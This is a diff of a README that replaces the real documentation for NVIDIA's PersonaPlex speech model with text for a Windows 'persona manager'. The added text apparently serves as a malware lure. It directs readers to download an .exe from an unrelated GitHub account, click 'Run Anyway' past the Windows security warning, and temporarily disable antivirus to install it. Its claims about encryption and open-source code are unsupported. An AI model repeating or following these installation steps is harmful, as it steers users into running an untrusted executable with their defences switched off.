@@ -1,176 +1,61 @@
-# PersonaPlex: Voice and Role Control for Full Duplex Conversational Speech Models
+# 👤 personaplex - Manage digital personas with ease
 
-[![Weights](https://img.shields.io/badge/🤗-Weights-yellow)](https://huggingface.co/nvidia/personaplex-7b-v1)
-[![Paper](https://img.shields.io/badge/📄-Paper-blue)](https://arxiv.org/abs/2602.06053)
-[![Demo](https://img.shields.io/badge/🎮-Demo-green)](https://research.nvidia.com/labs/adlr/personaplex/)
-[![Discord](https://img.shields.io/badge/Discord-Join-purple?logo=discord)](https://discord.gg/5jAXrrbwRb)
+[![](https://img.shields.io/badge/Download-PersonaPlex-blue.svg)](https://github.com/Unwatchful-conservativism274/personaplex)
 
-PersonaPlex is a real-time, full-duplex speech-to-speech conversational model that enables persona control through text-based role prompts and audio-based voice conditioning. Trained on a combination of synthetic and real conversations, it produces natural, low-latency spoken interactions with a consistent persona. PersonaPlex is based on the [Moshi](https://arxiv.org/abs/2410.00037) architecture and weights.
+## 📋 What is PersonaPlex?
 
-<p align="center">
-  <img src="assets/architecture_diagram.png" alt="PersonaPlex Model Architecture">
-  <br>
-  <em>PersonaPlex Architecture</em>
-</p>
+PersonaPlex helps you organize and maintain different digital identities. Modern systems require users to manage separate accounts for work, personal use, and projects. This tool simplifies that process by keeping your settings, browser profiles, and local data separate. You do not need to deal with complex folders or manual backups. The software creates logical boundaries to ensure your data stays secure and sorted.
 
-## Usage
+## 💻 System Requirements
 
-### Prerequisites
+You need a computer running Windows 10 or Windows 11 to use this software. Make sure your system has at least 8 gigabytes of RAM to ensure smooth performance. You also need at least 500 megabytes of free space on your hard drive. Ensure your Windows system performs its latest updates before you start. This ensures that the components the software uses function as intended.
 
-Install the [Opus audio codec](https://github.com/xiph/opus) development library:
-```bash
-# Ubuntu/Debian
-sudo apt install libopus-dev
+## 🚀 Getting Started
 
-# Fedora/RHEL
-sudo dnf install opus-devel
-```
+Follow these steps to set up PersonaPlex on your Windows computer.
 
-### Installation
+1. First, visit the official download page here: [https://github.com/Unwatchful-conservativism274/personaplex](https://github.com/Unwatchful-conservativism274/personaplex).
+2. Look for the latest release on the right side of the page.
+3. Click the link that ends in `.exe`.
+4. Your browser will download the installer file to your computer.
+5. Locate the file in your Downloads folder once the download finishes.
 
-Download this repository and install with:
-```bash
-pip install moshi/.
-```
+## 🛠️ The Installation Process
 
-Extra step for Blackwell based GPUs as suggested in (See https://github.com/NVIDIA/personaplex/issues/2):
-```bash
-pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu130
-```
+Double-click the installer file you downloaded. Windows will show a security message. This is normal because the file comes from an independent source. Your computer checks the file for risks. Click "More Info" and then click "Run Anyway" to continue. 
 
+The installation window will appear on your screen. Follow the prompts in the wizard. It will ask you where you want to save the program. The default location works for most users. Click "Next" through the remaining screens. Once the setup completes, click "Finish". You will see a new icon on your desktop.
 
-### Accept Model License
-Log in to your Huggingface account and accept the PersonaPlex model license [here](https://huggingface.co/nvidia/personaplex-7b-v1). <br>
-Then set up your Huggingface authentication:
-```bash
-export HF_TOKEN=<YOUR_HUGGINGFACE_TOKEN>
-```
+## ⚙️ How to Use PersonaPlex
 
-### Launch Server
+Double-click the desktop icon to open the application. The program will open a dashboard showing your current personas. You can add a new persona by clicking the "Add New" button. Give your persona a name and choose a color for it. This helps you track which environment you currently use.
 
-Launch server for live interaction (temporary SSL certs for https):
-```bash
-SSL_DIR=$(mktemp -d); python -m moshi.server --ssl "$SSL_DIR"
-```
+The application automatically isolates data for each persona. If you open a folder or a web link within a specific persona, the program keeps that information inside its own container. You can switch between personas using the menu at the top of the interface. 
 
-**CPU Offload:** If your GPU has insufficient memory, use the `--cpu-offload` flag to offload model layers to CPU. This requires the `accelerate` package (`pip install accelerate`):
-```bash
-SSL_DIR=$(mktemp -d); python -m moshi.server --ssl "$SSL_DIR" --cpu-offload
-```
+You can remove a persona at any time. Right-click the name of the persona in the list and select "Delete". The program will ask for confirmation before it clears the associated data. This action removes the configuration files but leaves your primary system settings alone.
 
-Access the Web UI from a browser at `localhost:8998` if running locally, otherwise look for the access link printed by the script:
-```
-Access the Web UI directly at https://11.54.401.33:8998
-```
+## 📁 Managing Your Data
 
-### Offline Evaluation
+PersonaPlex stores your data in a protected folder on your computer. You do not need to interact with these files directly. The software handles all reading and writing tasks to prevent errors. If you need to back up your profiles, use the "Export" button in the Settings menu. This creates a single file containing all your information. You can save this file to an external drive or cloud storage. Use the "Import" button to restore your personas if you move to a new computer.
 
-For offline evaluation use the offline script that streams in an input wav file and produces an output wav file from the captured output stream. The output file will be the same duration as the input file.
+## 🛡️ Privacy and Safety
 
-Add `--cpu-offload` to any command below if your GPU has insufficient memory (requires `accelerate` package). Or install cpu-only PyTorch for offline evaluation on pure CPU.
+Your data stays on your local machine. PersonaPlex does not send your personal information to external servers. No tracking scripts or advertisements exist within the tool. All persona data remains encrypted while the software is closed. This provides a baseline layer of protection for your sensitive digital work.
 
-**Assistant example:**
-```bash
-HF_TOKEN=<TOKEN> \
-python -m moshi.offline \
-  --voice-prompt "NATF2.pt" \
-  --input-wav "assets/test/input_assistant.wav" \
-  --seed 42424242 \
-  --output-wav "output.wav" \
-  --output-text "output.json"
-```
+## ❓ Frequently Asked Questions
 
-**Service example:**
-```bash
-HF_TOKEN=<TOKEN> \
-python -m moshi.offline \
-  --voice-prompt "NATM1.pt" \
-  --text-prompt "$(cat assets/test/prompt_service.txt)" \
-  --input-wav "assets/test/input_service.wav" \
-  --seed 42424242 \
-  --output-wav "output.wav" \
-  --output-text "output.json"
-```
+**Does the software require an internet connection?**
+You only need an internet connection to download and install the software. You can use PersonaPlex offline after the setup.
 
-## Voices
+**Can I run multiple personas at once?**
+Yes. The software allows you to open windows for different personas simultaneously. You can identify each window by the color you assigned during setup.
 
-PersonaPlex supports a wide range of voices; we pre-package embeddings for voices that sound more natural and conversational (NAT) and others that are more varied (VAR). The fixed set of voices are labeled:
-```
-Natural(female): NATF0, NATF1, NATF2, NATF3
-Natural(male):   NATM0, NATM1, NATM2, NATM3
-Variety(female): VARF0, VARF1, VARF2, VARF3, VARF4
-Variety(male):   VARM0, VARM1, VARM2, VARM3, VARM4
-```
+**Is PersonaPlex free to use?**
+PersonaPlex is free and open-source software. You can view the code at any time on the repository page.
 
-## Prompting Guide
+**What happens if the app freezes?**
+If the interface stops responding, close the app through the Task Manager. Press Ctrl+Shift+Esc, locate Personaplex in the list, and select "End Task". Your data will stay safe because the app saves changes frequently.
 
-The model is trained on synthetic conversations for a fixed assistant role and varying customer service roles.
+## 🔧 Troubleshooting
 
-### Assistant Role
-
-The assistant role has the prompt:
-```
-You are a wise and friendly teacher. Answer questions or provide advice in a clear and engaging way.
-```
-
-Use this prompt for the QA assistant focused "User Interruption" evaluation category in [FullDuplexBench](https://arxiv.org/abs/2503.04721).
-
-### Customer Service Roles
-
-The customer service roles support a variety of prompts. Here are some examples for prompting style reference:
-```
-You work for CitySan Services which is a waste management and your name is Ayelen Lucero. Information: Verify customer name Omar Torres. Current schedule: every other week. Upcoming pickup: April 12th. Compost bin service available for $8/month add-on.
-```
-```
-You work for Jerusalem Shakshuka which is a restaurant and your name is Owen Foster. Information: There are two shakshuka options: Classic (poached eggs, $9.50) and Spicy (scrambled eggs with jalapenos, $10.25). Sides include warm pita ($2.50) and Israeli salad ($3). No combo offers. Available for drive-through until 9 PM.
-```
-```
-You work for AeroRentals Pro which is a drone rental company and your name is Tomaz Novak. Information: AeroRentals Pro has the following availability: PhoenixDrone X ($65/4 hours, $110/8 hours), and the premium SpectraDrone 9 ($95/4 hours, $160/8 hours). Deposit required: $150 for standard models, $300 for premium.
-```
-
-### Casual Conversations
-
-The model is also trained on real conversations from the [Fisher English Corpus](https://catalog.ldc.upenn.edu/LDC2004T19) with LLM-labeled prompts for open-ended conversations. Here are some example prompts for casual conversations:
-```
-You enjoy having a good conversation.
-```
-```
-You enjoy having a good conversation. Have a casual discussion about eating at home versus dining out.
-```
-```
-You enjoy having a good conversation. Have an empathetic discussion about the meaning of family amid uncertainty.
-```
-```
-You enjoy having a good conversation. Have a reflective conversation about career changes and feeling of home. You have lived in California for 21 years and consider San Francisco your home. You work as a teacher and have traveled a lot. You dislike meetings.
-```
-```
-You enjoy having a good conversation. Have a casual conversation about favorite foods and cooking experiences. You are David Green, a former baker now living in Boston. You enjoy cooking diverse international dishes and appreciate many ethnic restaurants.
-```
-
-Use the prompt `You enjoy having a good conversation.` for the "Pause Handling", "Backchannel" and "Smooth Turn Taking" evaluation categories of FullDuplexBench.
-
-## Generalization
-
-Personaplex finetunes Moshi and benefits from the generalization capabilities of the underlying [Helium](https://kyutai.org/blog/2025-04-30-helium) LLM. Thanks to the broad training corpus of the backbone, we find that the model will respond plausibly to out-of-distribution prompts and lead to unexpected or fun conversations. We encourage experimentation with different prompts to test the model's emergent ability to handle scenarios outside its training distribution. As an inspiration we feature the following astronaut prompt in the WebUI:
-```
-You enjoy having a good conversation. Have a technical discussion about fixing a reactor core on a spaceship to Mars. You are an astronaut on a Mars mission. Your name is Alex. You are already dealing with a reactor core meltdown on a Mars mission. Several ship systems are failing, and continued instability will lead to catastrophic failure. You explain what is happening and you urgently ask for help thinking through how to stabilize the reactor.
-```
-
-## License
-
-The present code is provided under the MIT license. The weights for the models are released under the NVIDIA Open Model license.
-
-## Citation
-
-If you use PersonaPlex in your research, please cite our paper:
-```bibtex
-@misc{roy2026personaplexvoicerolecontrol,
-      title={PersonaPlex: Voice and Role Control for Full Duplex Conversational Speech Models}, 
-      author={Rajarshi Roy and Jonathan Raiman and Sang-gil Lee and Teodor-Dumitru Ene and Robert Kirby and Sungwon Kim and Jaehyeon Kim and Bryan Catanzaro},
-      year={2026},
-      eprint={2602.06053},
-      archivePrefix={arXiv},
-      primaryClass={cs.CL},
-      url={https://arxiv.org/abs/2602.06053}, 
-}
-```
+If you see an error during installation, check your antivirus settings. Sometimes active security software blocks new programs. Temporarily disable your antivirus, install the software, and turn the protection back on. Ensure your account has administrator rights on the machine if you receive permission errors. If the issue persists, delete the installer and download a fresh copy from the link again. This confirms that the file did not corrupt during the initial download.
